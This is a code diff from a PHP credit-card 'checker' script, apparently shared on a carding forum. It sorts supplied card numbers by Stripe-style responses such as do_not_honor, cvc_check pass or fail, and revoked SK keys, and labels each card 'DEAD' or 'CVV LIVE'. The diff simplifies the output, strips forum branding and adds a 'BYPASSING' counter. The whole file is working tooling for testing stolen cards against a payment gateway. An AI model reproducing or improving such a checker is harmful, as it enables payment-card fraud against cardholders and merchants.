-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">SERVICE FAILED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SERVICE NOT ALLOWED</span><br>';
     }
 elseif(strpos($result2, '"code": "processing_error"')) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">PROCESS ERROR</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PROCESSING ERROR</span><br>';
     }
 elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">INCORECT CARD NUMBER</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
     }
 elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">SERVICE-REQUIRED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SERVICE NOT ALLOWED</span><br>';
 
 }
 elseif(strpos($result, "incorrect_number")) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">INCORECT CARD NUMBER</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER</span><br>';
 }
 elseif(strpos($result1, "incorrect_number")) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">INCORECT CARD NUMBER</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER</span><br>';
 
 
 }elseif(strpos($result1, "do_not_honor")) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">DO-NOT-HONOR</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
 
 }
 elseif(strpos($result1, 'Your card was declined.')) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">DECLINED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED</span><br>';
 
 }
 elseif(strpos($result1, "do_not_honor")) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">DO-NOT-HONOR</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
     }
 elseif(strpos($result2, "generic_decline")) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">GENERIC-DECLINED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC CARD</span><br>';
 }
 elseif(strpos($result, 'Your card was declined.')) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">DECLINED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED</span><br>';
 
 }
 elseif(strpos($result2,' "decline_code": "do_not_honor"')){
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">DO-NOT-HONOR</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
 }
 elseif(strpos($result2,'"cvc_check": "unchecked"')){
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">CVC-CHK-FAIL</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_UNCHECKED : INFORM AT OWNER</span><br>';
 }
 elseif(strpos($result2,'"cvc_check": "fail"')){
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">CVC-CHK-FAIL</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECK : FAIL</span><br>';
 }
 elseif(strpos($result2, "card_not_supported")) {
-	echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">CARD-NOT-SUPPORTED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
 }
 elseif(strpos($result2,'"cvc_check": "unavailable"')){
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">CVC-CHK</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECK : UNVAILABLE</span><br>';
 }
 elseif(strpos($result2,'"cvc_check": "unchecked"')){
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">CVC-UNCHK</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_UNCHECKED : INFORM TO OWNER」</span><br>';
 }
 elseif(strpos($result2,'"cvc_check": "fail"')){
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">CVC-CHK-FAIL</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECKED : FAIL</span><br>';
 }
 elseif(strpos($result2,"currency_not_supported")) {
-	echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">NOT-SUPPORTED-CURRENCY</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CURRENCY NOT SUPORTED TRY IN INR</span><br>';
 }
 
 elseif (strpos($result,'Your card does not support this type of purchase.')) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">NOT SUPPORTED PURCHASE</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span> CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORT THIS TYPE OF PURCHASE</span><br>';
     }
 
 elseif(strpos($result2,'"cvc_check": "pass"')){
-    echo '<font size=3.5 color="white"><font class="badge badge-success">CVV LIVE </i></font> <font class="badge badge-success">'.$lista.'</i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『★CVV MATCHED★』 </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』 </font><br>';
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
 }
 elseif(strpos($result2, "fraudulent" )) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">FRAUDULENT</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
 }
 elseif(strpos($result1, "testmode_charges_only" )) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary">'.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">SK TESTMODE_CHARGE ONLY</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK KEY DEAD OR INVALID</span><br>';
 }
 elseif(strpos($result1, "api_key_expired" )) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary">  '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">SK KEY REVOKED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK KEY REVOKED</span><br>';
 }
 elseif(strpos($result1, "parameter_invalid_empty" )) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary">   '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">INVALID</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: ENTER CC TO CHECK</span><br>';
 }
 elseif(strpos($result1, "card_not_supported" )) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary">     '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">Card Not Supported</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
 }
 else {
-    echo '   <font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary">   '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-warning">Gate Closed</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span> CC:  '.$lista.'</span>  <br>Result: INCREASE AMOUNT OR TRY ANOTHER CARD</span><br>';
    
-
-      
+         
 }
 
+echo " BYPASSING: $x <br>";
 
+
+
+//===================== [ MADE BY Tx-Code ] ====================//
 
 
 //echo "<br><b>Lista:</b> $lista<br>";
@@ -380,13 +311,6 @@ else {
 //echo "<b>Reason:</b> $reason<br>";
 //echo "<b>Risk Level:</b> $riskl<br>";
 //echo "<b>Seller Message:</b> $seller_msg<br>";
-
-$end = microtime(true);
-$time_taken = $end - $start;
-
-echo "ᵗⁱᵐᵉ: " . round($time_taken, .5) . " s.";
-
-echo " ᵇʸᵖᵃˢˢⁱⁿᵍ: $x <br>";
 
 
 curl_close($ch);
